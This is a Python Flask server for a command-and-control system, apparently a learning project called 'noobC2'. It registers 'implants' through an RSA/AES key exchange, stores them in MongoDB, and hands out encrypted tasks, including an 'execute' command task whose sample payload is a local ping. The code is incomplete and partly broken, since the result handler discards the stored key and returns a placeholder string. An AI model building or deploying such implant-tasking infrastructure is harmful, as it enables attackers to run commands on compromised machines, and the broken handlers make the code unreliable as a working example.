from flask_pymongo import PyMongo
from flask import Flask
from flask import request
from AESProvider import AESProvider
from RSAProvider import RSAProvider
from Crypto.Random import get_random_bytes
import base64
import json

app = Flask(__name__)
app.config["MONGO_URI"] = "mongodb://localhost:27017/noobC2"
mongo = PyMongo(app)



@app.route("/keyExchange", methods=["POST"])
def key_exchange_setup():
    aesProvider = AESProvider(get_random_bytes(16))
    data = request.get_json()

    mongo.db.implants.insert({'name': data["name"], "aesKey":aesProvider.key, "tasks": [], "config": {"pullInterval": 5,"communicationMethod": "HTTP"}})

    rsa = RSAProvider(base64.b64decode(data["payload"].encode("ascii")).decode('ascii'))
    encryptedKey = rsa.encrypt(aesProvider.key)

    return base64.b64encode(encryptedKey)

@app.route("/getConfig/<name>", methods=["GET"])
def get_config(name):
    implant = mongo.db.implants.find_one({"name": name})
    aesProvider = AESProvider(implant["aesKey"])
    return aesProvider.encrypt(json.dumps(implant["config"]))

@app.route("/getNextTask/<name>", methods=["GET"])
def get_next_task(name):
    implant = mongo.db.implants.find_one({"name": name})
    aesProvider = AESProvider(implant["aesKey"])
    implant["tasks"].append("""{"taskName": "execute", "payload" : "ping 127.0.0.1", "result" :"pending"}""")
    try:
        implant["tasks"][0]
    except:
        return aesProvider.encrypt("lalala")
    return aesProvider.encrypt(implant["tasks"][0])

@app.route("/updateTaskResult/<name>", methods=["POST"])
def update_task_result(name):
    data = request.get_json()
    #CHange that where I create a new AES provider using the key retrieved from mongodb
    aesProvider = AESProvider(get_random_bytes(16))
    aesKey = mongo.db.implants.find_one({"name": data["name"]})
    #encryptedResponse = aesProvider.encrypt("decryptedString23")

    return "encryptedResponse"



app.run()